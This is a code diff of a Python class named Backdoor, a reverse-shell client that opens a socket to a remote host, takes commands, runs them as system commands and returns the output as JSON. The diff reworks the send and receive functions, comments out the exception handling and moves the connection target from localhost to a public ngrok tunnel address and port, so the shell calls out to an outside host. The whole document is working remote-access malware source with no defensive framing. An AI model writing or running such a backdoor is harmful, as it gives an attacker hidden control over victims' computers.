@@ -14,20 +14,22 @@ class Backdoor:
         self.connection.connect((self.ip, self.port))
 
     def reliable_send(self, data):
-        try:
-            data = data.decode("utf-8")
-        except:
-            print("[-] decode error")
-            pass
+        if type(data) is not bytes:
+            json_data = json.dumps(data)
+            json_data = json_data.encode("utf-8")
 
-        json_data = json.dumps(data)
-        json_data = json_data.encode("utf-8")
+        else:
+            data = data.decode("utf-8")
+            json_data = json.dumps(data)
+            json_data = json_data.encode("utf-8")
+
         self.connection.send(json_data)
-        print(f"[+] rel send -> {data}")
+        print(f"[+] rel send -> {data}\n")
 
     def reliable_receive(self):
         json_data = self.connection.recv(1024)
         json_data = json_data.decode("utf-8")
+        print(f"-- {json_data}")
         command = json.loads(json_data)
         command = command.split(" ")
         print(f"[+] rcv -> {command}")
@@ -59,9 +61,10 @@ class Backdoor:
     def run(self):
 
         while True:
-            try:
-                command = self.reliable_receive()
+            #try:
+            command = self.reliable_receive()
 
+            if command[0] != "":
                 if command[0] == "exit":
                     self.connection.close()
                     exit()
@@ -78,15 +81,17 @@ class Backdoor:
                 else:
                     command_result = self.execute_system_command(command)
 
+                print("[!] cmd res type", type(command_result))
                 self.reliable_send(command_result)
 
-            except Exception:
-                command_result = "[-] Error during comand execution ::Client::"
-                self.reliable_send(command_result)
+            #except Exception:
+                #command_result = "[-] Error during comand execution ::Client::"
+                #self.reliable_send(command_result)
+
 
 if __name__ == "__main__":
-    ip = "127.0.0.1"
-    port = 8080
+    ip = "7.tcp.eu.ngrok.io"
+    port = 12436
 
     backdoor = Backdoor(ip, port)
     backdoor.run()
